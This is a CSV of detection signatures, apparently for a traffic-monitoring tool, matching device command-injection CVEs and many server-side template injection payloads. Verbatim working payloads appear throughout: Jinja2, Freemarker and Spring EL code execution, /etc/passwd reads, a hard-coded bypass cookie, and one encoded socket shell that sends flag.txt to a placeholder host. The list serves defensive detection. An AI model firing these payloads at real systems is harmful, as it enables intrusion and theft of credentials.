name,description,signature,threat_score,color,background_color,link,CVE,CVSS,,
2.27 - Authenticated Command Injection ,Authenticated Path Traversal,GET /cgi-bin/storage_cgi\?id=2&pwd=[^&]+,10,#000000,#ff000040,https://nvd.nist.gov/vuln/detail/CVE-2019-6275,2019-6275 2019-6274 2019-6273 2019-6272,8.8,,
2.27 - Authenticated Command Injection ,Authenticated Command Injection,POST /cgi-bin/firmware_cgi\?action=setautoupdate&auto_update=off&update_time=[^&]+,10,#000000,#ff000040,https://nvd.nist.gov/vuln/detail/CVE-2019-6275,2019-6275 2019-6274 2019-6273 2019-6272,8.8,,
ENC-400 - Command Injection ,The attack is aimed at exploiting a command injection vulnerability in the login form. ,POST /check.lp,10,#000000,#ff000040,https://nvd.nist.gov/vuln/detail/CVE-2018-20220,2018-20220 2018-20219 2018-20218,9.8,,s
ENC-400 - Command Injection ,The attack involves setting a hard-coded authentication cookie to bypass authentication. ,"cookies\.sethtml\(""AuthByPasswdENC400"",""Teracue:dGFpOfrtmR1bW1thrf5dGV4nhyxxdA=="",{path='/'}",10,#000000,#ff000040,https://nvd.nist.gov/vuln/detail/CVE-2018-20220,2018-20220 2018-20219 2018-20218,9.8,,
ENC-400 - Command Injection ,This vulnerability allows unauthenticated access to sensitive endpoints,/configuration.xml,10,#000000,#ff000040,https://nvd.nist.gov/vuln/detail/CVE-2018-20220,2018-20220 2018-20219 2018-20218,9.8,,
Unauthenticated Command Injection,"This vulnerability allows an unauthenticated attacker to inject arbitrary OS commands, leading to the compromise of the affected installation.",POST /smartdomuspad/modules/reporting/track_import_export.php HTTP/1.1.*op=export&language=english&interval=1&object_id=`.*`,10,#00000A,#ff00004a,https://nvd.nist.gov/vuln/detail/CVE-2018-7841,2018-7841,9.8,,
Server Side Template Injection,N/A,"\{\{'a'\.getClass\(\)\.forName\('javax\.script\.ScriptEngineManager'\)\.newInstance\(\)\.getEngineByName\('JavaScript'\)\.eval\(""new java\.lang\.String\('xxx'\)""\)\}\}",5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,N/A,"\{\{'a'\.getClass\(\)\.forName\('javax\.script\.ScriptEngineManager'\)\.newInstance\(\)\.getEngineByName\('JavaScript'\)\.eval\(""var x=new java\.lang\.ProcessBuilder; x\.command\(\\\""whoami\\\""\); x\.start\(\)""\)\}\}",9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attacker is testing against SSTI vuln,[$@# ]*[{(]+[ ]*[0-9]+[ ]*[*+-/][ ]*[0-9]+[ ]*[})]+,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attacker is testing against SSTI vuln,{{[ ]*[0-9]+[ ]*[0-9]+[ ]*}}[[[ ]*[0-9]+[ ]*[0-9]+[ ]*],9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attacker is testing against SSTI vuln,[{]+dump[(]+[a-z]*[)]+[}]+,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attacker is testing against SSTI vuln,"{{app.request.server.all|join(',')}}",7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attacker is testing against SSTI vuln,{{config.items()}},9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attacker is testing against SSTI vuln,[{]+[ ]*request[ ]*[}]+,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attacker is testing against SSTI vuln,[{]+[ ]*self[ ]*[}]+,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attacker is testing against SSTI vuln,[{ ]+[' [\]]*\.class\.[a-z]+[([)\]0-9]*\.subclasses\(\)[ ]?[}]+,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attempt to gain passwords,[{]+\['cat[\\$][a-zA-Z0-9]+\/etc\/passwd'][ ]*\|[ ]*filter\('[a-zA-z]*'\)[}]+,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attempt to gain passwords,[<]+%=[ ]*[Ff]ile[ ]*\.[ ]*open[ ]*[(]+'\/etc\/passwd'[)]+[ ]*\.[ ]*[A-Za-z]+[ ]%[ ]*[>]+,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attacker trying to access the class attribute of request object,"[{ ]*request\s*\|\s*attr\s*\(\s*\[\s*request\.args\.usc\*2\s*,\s*request\.args\.class\s*,\s*request\.args\.usc\*2\s*\]\s*\|\s*join\s*\)\s*\}\}|\{\{\s*request\s*\|\s*attr\s*\(\s*\[""_""\*2\s*,""class""\s*,""_""\*2\s*\]\s*\|\s*join\s*\)\s*\}\}|\{\{\s*request\s*\|\s*attr\s*\(\s*\[""__""\s*,""class""\s*,""__""\]\s*\|\s*join\s*\)\s*\}\}|\{\{\s*request\s*\|\s*attr\s*\(""__class__""\)\s*[} ]+",9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Use of java toString to hide real input,toString[ ]*[(]+[1-9]+[ ]*[)]+[ ]*\.[ ]*concat[ ]*[(]+[ ]*T[ ]*[(]+java\.lang\.Character[ ]*[)]+\.,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Retrieve /etc/passwd using Python's subprocess,"{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}",6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Dump config values using Jinja2 template iteration,"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Freemarker template injection to execute command,"<#assign\s*ex\s*=\s*""freemarker\.template\.utility\.Execute""\s*\?\s*new\s*>\s*\$\{\s*ex\s*\(\s*"".*?""\s*\)\}",7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Retrieve /etc/passwd using class manipulation,[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Retrieve /etc/passwd using config manipulation,"${""freemarker.template.utility.Execute""?new()(""id"")}",8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Retrieve /etc/passwd using class manipulation and subprocess,"{{app.request.query.filter(0,0,1024,{'options':'system'})}}",6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Retrieve file listing using os module and popen,{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }},9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Execute command using class manipulation and request.args.input,"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/etc/passwd"").read() }}",9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Execute 'id' command using chained attribute access,"{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,N/A,{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,N/A,"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,N/A,{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,N/A,*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Retrieve environment variables using Java System class,${T(java.lang.System).getenv()},9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Retrieve /etc/passwd using Java Runtime,${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B2%2A2%7D%7D%5B%5B3%2A3%5D%5D%0A,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B3%2A3%7D%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B3%2A%273%27%7D%7D%0A,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%3C%25%3D%203%20%2A%203%20%25%3E%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%24%7B6%2A6%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%24%7B%7B3%2A3%7D%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%40%286%2B5%29%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%23%7B3%2A3%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%23%7B%203%20%2A%203%20%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Bdump%28app%29%7D%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Bconfig.items%28%29%7D%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%27%27%2E%5F%5Fclass%5F%5F%2E%5F%5Fbase%5F%5F%2E%5F%5Fsubclasses%5F%5F%28%29%5B227%5D%28%27cat%20%2Fetc%2Fpasswd%27%2C%20shell%3DTrue%2C%20stdout%3D%2D1%29%2Ecommunicate%28%29%7D%7D,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%20request%20%7D%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Bself%7D%7D%0A,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%3C%25%3D%20File.open%28%27/etc/passwd%27%29.read%20%25%3E%0A,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%7B%20ex%28%27id%27%29%7D%0A,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Bapp.request.query.filter%280%2C0%2C1024%2C%7B%27options%27%3A%27system%27%7D%29%7D%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B40%5D%28%27/etc/passwd%27%29.read%28%29%20%7D%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%20config.items%28%29%5B4%5D%5B1%5D.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B40%5D%28%22/etc/passwd%22%29.read%28%29%20%7D%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%27%27.__class__.mro%28%29%5B1%5D.__subclasses__%28%29%5B396%5D%28%27cat%20/etc/passwd%27%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%5B0%5D.strip%28%29%7D%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27ls%27%29.read%28%29%7D%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28request.args.input%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25endfor%25%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%24smarty.version%7D%0A,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%5B%27id%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%5B%27cat%5Cx20/etc/passwd%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%5B%27cat%24IFS/etc/passwd%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Brequest%7Cattr%28%5B%22_%22%2A2%2C%22class%22%2C%22_%22%2A2%5D%7Cjoin%29%7D%7D%0A,6,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Brequest%7Cattr%28%5B%22__%22%2C%22class%22%2C%22__%22%5D%7Cjoin%29%7D%7D%0A,7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Brequest%7Cattr%28%22__class__%22%29%7D%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Brequest.__class__%7D%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7Brequest%7Cattr%28%27application%27%29%7Cattr%28%27%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%27%29%28%27os%27%29%7Cattr%28%27popen%27%29%28%27id%27%29%7Cattr%28%27read%27%29%28%29%7D%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22new%20java.lang.String%28%27xxx%27%29%5C%22%29%7D%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22whoami%5C%5C%5C%22%29%3B%20x.start%28%29%5C%22%29%7D%7D%0A,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22netstat%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,8,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22uname%5C%5C%5C%22%2C%5C%5C%5C%22-a%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ip%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22/bin/cat%5C%22%2C%20%5C%22flag.txt%5C%22%5D%29%3B%27%22%29.read%28%29.zfill%28417%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%24%7BT%28java.lang.System%29.getenv%28%29%7D%0A,5,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc/passwd%27%29%7D%0A,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,URL_ENCODED_PAYLOAD_FOUND,%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D%0A,9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attempt to access global namespace,\{\{([^\}]*\.__globals__\.\w+\s*){3}\}\},7,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Attempt to access global OS module,\{\{self\._TemplateReference__(\.context\.cycler|\.context\.joiner|\.context\.namespace)?\.os\}\},9,#00000A,#ff00004a,N/A,N/A,N/A,,
Server Side Template Injection,Template Injection,\${self(\.attr)?(\._NSAttr__parent)?(\.context|\.module|\.template)?(\.runtime)?(\.mmarker)?(\.cache)?(\.filters)?(\.exceptions)?(\.util)?(\.inspect)?\.os\.system\(,5,#00000A,#ff00004a,N/A,N/A,N/A,,
